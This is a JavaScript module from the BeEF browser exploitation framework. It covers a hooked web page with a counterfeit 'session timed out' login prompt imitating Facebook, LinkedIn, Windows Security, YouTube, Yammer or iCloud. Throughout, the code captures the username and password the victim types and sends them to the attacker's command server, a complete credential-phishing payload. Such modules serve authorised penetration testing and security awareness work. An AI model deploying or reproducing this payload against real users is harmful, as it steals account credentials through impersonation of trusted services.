//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
	imgr = "<%== @imgsauce %>";
	var answer= '';
	// set up darkening
	function grayOut(vis, options) {
	  // Pass true to gray out screen, false to ungray
	  // options are optional.  This is a JSON object with the following (optional) properties
	  // opacity:0-100         // Lower number = less grayout higher = more of a blackout 
	  // zindex: #             // HTML elements with a higher zindex appear on top of the gray out
	  // bgcolor: (#xxxxxx)    // Standard RGB Hex color code
	  // grayOut(true, {'zindex':'50', 'bgcolor':'#0000FF', 'opacity':'70'});
	  // Because options is JSON opacity/zindex/bgcolor are all optional and can appear
	  // in any order.  Pass only the properties you need to set.
	  var options = options || {};
	  var zindex = options.zindex || 50;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    // The dark layer doesn't exist, it's never been created.  So we'll
	    // create it here and apply some basic styles.
	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	    // Calculate the page width and height 
	    //if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
	    //    var pageWidth = document.body.scrollWidth+'px';
	    //    var pageHeight = document.body.scrollHeight+'px';
	    //} else if( document.body.offsetWidth ) {
	    //  var pageWidth = document.body.offsetWidth+'px';
	    //  var pageHeight = document.body.offsetHeight+'px';
	    //} else {
	    
	    // Previous lines were not rendering page background correctly
	       var pageWidth='100%';
	       var pageHeight='100%';
	    //}
	    //set the shader to cover the entire page and make it visible.
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	}

	// CURRENTLY NOT USED
	// Send done prompt to user
	function win(){
		document.getElementById('popup').innerHtml='<h2>Thank you for re-authenticating, you will now be returned to the application</h2>';
		answer = document.getElementById('uname').value+':'+document.getElementById('pass').value;
	}


	// Check whether the user has entered a user/pass and pressed ok
	function checker(){
		uname1 = document.getElementById("uname").value;
		pass1 = document.getElementById("pass").value;
		valcheck = document.getElementById("buttonpress").value;
		
		if (uname1.length > 0 && pass1.length > 0 && valcheck == "true") {
			// Join user/pass and send to attacker
			answer = uname1+":"+pass1
  			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);	
			// Set lastchild invisible
			document.body.lastChild.setAttribute('style','display:none');
			clearInterval(credgrabber);
			// Lighten screen
			grayOut(false);
			$j('#popup').remove();
			$j('#darkenScreenObject').remove();

		}else if((uname1.length == 0 || pass1.length == 0) && valcheck == "true"){
			// If user has not entered any data, reset button
			document.body.lastChild.getElementById("buttonpress").value = "false";
			alert("Please enter a valid username and password.");		
		}
	}


	// Facebook floating div
	function facebook() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);
		
		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder = 'style="width:330px;background:white;border:10px #999999 solid;border-radius:8px"';
		var windowmain = 'style="border:1px #555 solid;"';
 		var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(109, 132, 180);font-size: 13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: left;height: 18px;"';
		var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle = 'style="align:left;font-size:11px;font-family:tahoma,verdana,arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle = 'style="color: grey;font-size: 11px;font-weight: bold;font-family: tahoma,verdana,arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color: rgb(109,132,180);"';	
		var buttonstyle = 'style="font-size: 13px;background:#627aac;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
 
        	var title = 'Facebook Session Timed Out';
	        var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
        	var buttonLabel = '<input type="button" name="ok" value="Log in" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Email: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';
		
		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);
	}


	// Linkedin floating div
	function linkedin() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);

		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
		var windowmain = 'style="border:1px #555 solid;"';
 		var tbarstyle = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';

//-moz-box-shadow: 0 1px 4px #ccc;-webkit-box-shadow: 0 1px 4px #CCC;-o-box-shadow: 0 1px 4px #ccc;box-shadow: 0 1px 4px #CCC;

		var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle = 'style="align:left;font-size:11px;font-family:Arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
		var buttonstyle = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
		var lilogo = 'http://content.linkedin.com/etc/designs/linkedin/katy/global/clientlibs/img/logo.png';
        	var title = 'Session Timed Out <img src="' + lilogo + '" align=right height=20 width=70 alt="LinkedIn">';
	        var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
        	var buttonLabel = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Email: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';

		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);
	}

	// Windows floating div
	function windows() {
		sneakydiv = document.createElement('div');
                sneakydiv.setAttribute('id', 'popup');
                sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:#ffffff;border-radius:6px;');
                document.body.appendChild(sneakydiv);

                // Set appearance using styles, maybe cleaner way to do this with CSS block?

		// Set window border
		var edgeborder = 'style="border:1px #000000 solid;border-radius:6px;"';
		var windowborder  = 'style="width:400px;border: 7px #CFE7FE solid;border-radius:6px;"';

		var windowmain    = 'style="border:1px #000000 solid;"';

		var titlebarstyle = 'style="background:#CFE7FE;height:19px;font-size:12px;font-family:Segoe UI;"';
		var titlebartext = 'Windows Security';

		var promptstyle = 'style="height:40px;"';
		var titlestyle = 'style="align:left;font-size:14px;font-family:Segoe UI;margin:10px 15px;line-height:100%;color:0042CE;"';
		var title = 'Enter Network Password';
		var bodystyle = 'style="align:left;font-size:11px;font-family:Segoe UI;margin:10px 15px;line-height:170%;"';
		var body = 'Enter your password to connect to the server';
		var dividestyle = 'style="border-bottom:1px solid #DFDFDF;height:1px;width:92%;margin-left:auto;margin-right:auto;"';

		var tablestyle = 'style="background:#CFE7FE;width:90%;margin-left:auto;margin-right:auto;border:1px solid #84ACDD;border-radius:6px;height:87px"';
		var logobox = 'style="border:4px #84ACDD solid;border-radius:7px;height:45px;width:45px;background:#ffffff"';
		var logo = 'style="border:1px #000000 solid;height:43px;width:42px;background:#CFE7FE;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#EEF2F4, endColorstr=#CCD8DF);background: -webkit-gradient(linear, left top, left bottom, from(#ffffff), to(#CFE7FE));background: -moz-linear-gradient(top,  #EEF2F4,  #CCD8DF);"';

		var inputboxstyle = 'style="width:140px;font-size:11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#666666;color:#000000;border-radius:3px;"';

		var credstextstyle = 'style="font-size:11px;font-family:Segoe UI;"';

		var buttonstyle   = 'style="font-size: 13px;background:#069;color:#000000;border: 1px #29447e solid;padding: 3px 3px 3px 3px;margin-right:5px;border-radius:5px;width:70px;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#ffffff, endColorstr=#CFCFCF);background: -webkit-gradient(linear, left top, left bottom, from(#ffffff), to(#CFCFCF));background: -moz-linear-gradient(top,  #ffffff,  #CFCFCF);"';
		var buttonLabel  = '<input type="button" name="ok" value="OK" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		var bbarstyle     = 'style="background-color:#F0F0F0;padding:8px;text-align:right;border-top: 1px solid #DFDFDF;height:28px;margin-top:10px;"';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="edge" '+edgeborder+'><div id="window_container" '+windowborder+ '><div id="title_bar" ' +titlebarstyle+ '>' +titlebartext+ '</div><div id="windowmain" ' +windowmain+ '><div id="prompt" '+promptstyle+'><p><span ' +titlestyle+ '>' +title+ '</span><br/><span ' +bodystyle+ '>' + body + '</span></div><div id="divide" ' +dividestyle+ '></div></p><table ' +tablestyle+ '><tr><td rowspan="3" width=75px align="center"><div id="logobox" ' +logobox+ '><div id="logo" ' +logo+ '></div></div></td><td align="left"><input type="text" id="uname" placeholder="User name" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="left"><input type="password" id="pass" name="pass" placeholder="Password" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td><input type="checkbox"><span ' +credstextstyle+ '>Remember my credentials</span></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div></div>';

		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);
	}

	// YouTube floating div
	function youtube() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);

		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder  = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
		var windowmain    = 'style="border:1px #555 solid;"';
 		var tbarstyle     = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
		var bbarstyle     = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle  = 'style="align:left;font-size:11px;font-family:Arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle  = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
		var buttonstyle   = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
		var logo  = 'http://www.youtube.com/yt/brand/media/image/yt-brand-standard-logo-630px.png';
		var title = 'Session Timed Out <img src="' + logo + '" align=right height=20 width=70 alt="YouTube">';
		var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
		var buttonLabel  = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Username: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';

		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);

	}

	// Yammer floating div
	function yammer() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);

		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder  = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
		var windowmain    = 'style="border:1px #555 solid;"';
 		var tbarstyle     = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
		var bbarstyle     = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle  = 'style="align:left;font-size:11px;font-family:Arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle  = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
		var buttonstyle   = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
		var logo  = 'https://www.yammer.com/favicon.ico';
		var title = 'Session Timed Out <img src="' + logo + '" align=right height=24 width=24 alt="Yammer">';
		var messagewords = 'Your Yammer session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
		var buttonLabel  = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Username: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';

		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);

	}

    function ios() {

      /* start of Framework7 css
       * Framework7 0.10.0
       * Full Featured HTML Framework For Building iOS 7 Apps
       *
       * http://www.idangero.us/framework7
       *
       * Copyright 2014, Vladimir Kharlampidi
       * The iDangero.us
       * http://www.idangero.us/
       *
       * Licensed under MIT
       *
       * Released on: December 8, 2014
      */
    var styles = '   * {' +
        'font-family: Helvetica Neue,Helvetica,Arial,sans-serif;'+
        'margin: 0;'+
        'padding: 0;'+
        'font-size: 14px;' +
        'line-height: 1.4;' +
        '-webkit-text-size-adjust: 100%;' +
        'overflow: hidden;' +
        '-webkit-tap-highlight-color: transparent; ' +
        '-webkit-touch-callout: none; } ';

     styles += 'input { outline: 0; }';
     styles += '.modal-overlay { ' +
        'position: absolute; ' +
        'left: 0; ' +
        'top: 0; ' +
        'width: 100%;' +
        'height: 100%;' +
        'background: rgba(0,0,0,.4);' +
        ' z-index: 10600;' +
        ' visibility: hidden;' +
        'opacity: 0; ' +
        '-webkit-transition-duration: 400ms;' +
        'transition-duration: 400ms; } ';

    styles += '.modal-overlay.modal-overlay-visible { visibility: visible; opacity: 1;} ';
    styles += '.modal { width: 270px; position: absolute; z-index: 11000; left: 50%; ' +
        'margin-left: -135px; margin-top: 0; top: 50%; text-align: center; border-radius: 7px;' +
        'opacity: 0; -webkit-transform: translate3d(0,0,0) scale(1.185); ' +
        'transform: translate3d(0,0,0) scale(1.185); -webkit-transition-property: -webkit-transform,opacity;' +
        'transition-property: transform,opacity; color: #000;}';

    styles += '.modal.modal-in {opacity: 1; -webkit-transition-duration: 400ms;transition-duration: 400ms;' +
        '-webkit-transform: translate3d(0,0,0) scale(1); transform: translate3d(0,0,0) scale(1);}';
    styles += '.modal-inner { padding: 15px;border-bottom: 1px solid #b5b5b5;border-radius: 7px 7px 0 0;' +
    'background: #e8e8e8;}';
    styles += '.modal-title { font-weight: 500; font-size: 18px;text-align: center}';
    styles += '.modal-title + .modal-text {margin-top: 5px;}';
    styles += '.modal-buttons { height: 44px; overflow: hidden;' +
        'display: -webkit-box;' +
        'display: -webkit-flex;' +
        'display: flex;' +
        '-webkit-box-pack: center;' +
        '-webkit-justify-content: center;' +
        'justify-content: center;}';

     styles += '.modal-button {' +
        'width: 100%;' +
        'padding: 0 5px;' +
        'height: 44px;' +
        'font-size: 17px;' +
        'line-height: 44px;' +
        'text-align: center;' +
        'color: #007aff;' +
        'background: #e8e8e8;' +
        'display: block;' +
        'position: relative;' +
        'white-space: nowrap;' +
        'text-overflow: ellipsis;'+
        'overflow: hidden;'+
        'cursor: pointer;'+
        '-webkit-box-sizing: border-box;'+
        'box-sizing: border-box;'+
        'border-right: 1px solid #b5b5b5;'+
        '-webkit-box-flex: 1;} ';

      styles += '.modal-button.modal-button-bold {font-weight: 500;} ';
      styles += '.modal-button:first-child {border-radius:0 0 0 7px;} ';
      styles += '.modal-button:last-child {'+
        ' border-radius: 0 0 7px 0;' +
        ' border-bottom: none; } ';
      styles += "input.modal-text-input {" +
        "-webkit-box-sizing: border-box;" +
        "box-sizing: border-box;" +
        "height: 30px;" +
        "background: #fff;"+
        "margin: 0;" +
        "margin-top: 15px;" +
        "padding: 0 5px;" +
        "border: 1px solid #a0a0a0;" +
        "border-radius: 5px;" +
        "width: 100%;" +
        "font-size: 14px;" +
        "font-family: inherit;" +
        "display: block;" +
        "-webkit-box-shadow: 0 0 0 transparent;" +
        "box-shadow: 0 0 0 transparent;" +
        "-webkit-appearance: none;" +
        "appearance: none; }";
      styles += "input.modal-text-input.modal-text-input-double {" +
        "border-radius: 5px 5px 0 0; }";
      styles += "input.modal-text-input.modal-text-input-double+input.modal-text-input {"+
       " margin-top: 0;" +
       " border-top: 0;" +
       " border-radius: 0 0 5px 5px; }";
      /*end of Framework7 css*/
      styles += "input[type=submit] { " +
       " visibility: hidden;" +
       " position: absolute;" +
       " top: -999px; }";

      styles += "input[type=text],input[type=password] { " +
       " font-size: 16px; }" ;

      styles += "#pass + div {"+
       " display: block;"+
        "position: absolute;"+
        "top: -10px;"+
        "left: -53px;"+
        "width: 3000px;"+
        "height: 3000px;"+
        "background-color: white;"+
        "z-index: 1;"+
        "font-size: 14px;"+
        "pointer-events: none;"+
        "text-align: left; }";

      styles += '@media only screen ' +
      'and (min-device-width : 768px)' +
      'and (max-device-width : 1024px)' +
      'and (orientation : landscape) {' +
          '.modal.modal-in {' +
             ' opacity: 1;' +
              '-webkit-transition-duration: 400ms;'+
              'transition-duration: 400ms;'+
              '-webkit-transform: translate3d(0,0,0) scale(0.9);'+
              'transform: translate3d(0,0,0) scale(0.9);' +
              'left: 200px;} ' +
         ' #pass + div { top: -23px; left: -87px;} }';

      styles +='@media only screen and (min-device-width : 768px)' +
      'and (max-device-width : 1024px) and (orientation : portrait) {' +
      '.modal.modal-in { opacity: 1; -webkit-transition-duration: 400ms;' +
      'transition-duration: 400ms; -webkit-transform: translate3d(0,0,0) scale(0.8);'+
      'transform: translate3d(0,0,0) scale(0.8);} ' +
      '#pass + div {top: -39px;left: -305px;} }';

      styles += '#pass:focus + div {display: none;}';

        styleElement = $j(document.createElement('style')).text(styles);
        title = $j(document.createElement('div'));
        title.text('iCloud login');
        title.addClass('modal-title');

        description = $j(document.createElement('div'));
        description.addClass('modal-text');
        description.text('Enter your Apple ID e-mail address and password');

        user = $j(document.createElement('input'));
        user.addClass('modal-text-input').addClass('modal-text-input-double');
        user.attr('name','modal-username');
        user.attr('id','uname');
        user.text('');
        user.keydown(function(event) {
            if(event.keyCode == 13) {
                $j('#buttonpress').attr('value', 'true');
            }
        });

        password = $j(document.createElement('input'));
        password.addClass('modal-text-input').addClass('mobile-text-input-double');
        password.attr('autofocus','');
        password.attr('id', "pass");
        password.attr('name',"modal-password");
        password.attr('placeholder',"Password");
        password.attr('type', 'password');
        password.keydown(function(event) {
            if(event.keyCode == 13) {
                $j('#buttonpress').attr('value', 'true');
            }
        });

        cancel = $j(document.createElement('span'));
        cancel.addClass('modal-button');
        cancel.text('Cancel');

        ok = $j(document.createElement('span'));
        ok.addClass('modal-button').addClass('modal-button-bold');
        okLabel = $j(document.createElement('label'));
        okLabel.attr('for','submit');
        okLabel.css('width', '100%');
        okLabel.css('height', '100%');
        okLabel.text('OK');
        okLabel.click(function() {
            $j('#buttonpress').attr('value','true');
        });
        okLabel.append(
            $j(document.createElement('input'))
                        .attr('id', 'submit')
                        .attr('type','submit')
                        .attr('value','OK'),
            $j(document.createElement('input'))
                        .attr('id','buttonpress')
                        .attr('type', 'hidden')
                        .attr('name','buttonpress')
                        .attr('value', 'false')
        );
        ok.append(okLabel);

        var buttons = $j(document.createElement('div'));
        buttons.addClass('modal-buttons');
        buttons.append(cancel, ok);
        var inner = $j(document.createElement('div'));
        inner.addClass('modal-inner');
        inner.append(title, description, user,password);
        uiContainer = $j(document.createElement('div'));
        uiContainer.addClass('modal').addClass('modal-in');
        uiContainer.css('top', '10px');
        uiContainer.append(inner, buttons);

        sneakydiv = $j(document.createElement('div'));
        sneakydiv.addClass('modal-overlay').addClass('modal-overlay-visible');
        sneakydiv.attr('id','popup');
        sneakydiv.append(styleElement, uiContainer);
        $j('body').append(sneakydiv);
        credgrabber = setInterval(checker, 1000);
    }

	// Generic floating div with image
	function generic() {
		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'width:400px;position:absolute; top:20%; left:40%; z-index:51; background-color:white;font-family:\'Arial\',Arial,sans-serif;border-width:thin;border-style:solid;border-color:#000000');
		sneakydiv.setAttribute('align', 'center');
		document.body.appendChild(sneakydiv);
		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"buttonpress\").value=\"true\";\' value=\'Ok\'><br/><input type="hidden" id="buttonpress" name="buttonpress" value="false"/>';
		
		// Repeatedly check if button has been pressed		
		credgrabber = setInterval(checker,1000);

	}
	
	// Set background opacity and apply background 
	var backcolor = "<%== @backing %>";	  
	if(backcolor == "Grey"){
		grayOut(true,{'opacity':'70'});
	} else if(backcolor == "Clear"){
		grayOut(true,{'opacity':'0'});
	}

	// Retrieve the chosen div option from BeEF and display
	var choice = "<%= @choice %>";	
	switch (choice) {
		case "Facebook":
			facebook(); break;
		case "LinkedIn":
			linkedin(); break;
		case "Windows":
			windows(); break;
		case "YouTube":
			youtube();  break;
		case "Yammer":
			yammer();   break;
        case "IOS":
            ios(); break;
		default:
			generic();  break;
	}

});
